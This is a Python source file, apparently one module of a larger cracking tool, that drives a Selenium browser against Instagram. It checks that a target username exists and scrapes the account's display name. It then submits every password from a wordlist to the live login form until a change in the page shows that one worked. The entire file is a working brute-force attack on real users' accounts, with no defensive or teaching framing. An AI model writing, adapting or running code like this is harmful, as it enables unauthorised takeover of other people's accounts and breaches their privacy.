import time
from selenium.webdriver.common.keys import Keys

class Instagram:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.wordlist = wordlist
        self.delay = delay
        self.url = 'https://www.instagram.com/accounts/login/'

    def check_user(self):
        self.browser.driver.get('https://instagram.com/%s' % self.username)
        username = '@' + self.username
        if username in self.browser.driver.title:
            try:
                name = self.browser.driver.find_element_by_xpath("//span[@id=\"react-root\"]/section/main/div/header/section/div[2]/h1")
                self.name = name.text
                return True
            except:
                self.name = ''
                return False
        else:
            return False

    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        for password in passwords:
            self.browser.driver.get(self.url)
            time.sleep(0.5)
            email = self.browser.driver.find_element_by_name('username')
            email.clear()
            email.send_keys(self.username)
            pwd = self.browser.driver.find_element_by_name('password')
            pwd.clear()
            pwd.send_keys(password)
            pwd.send_keys(Keys.RETURN)

            time.sleep(1)
            url = self.browser.driver.current_url
            if (url != self.url) and (not 'Login' in self.browser.driver.title):
                found = password
                break
            time.sleep(self.delay)

        return found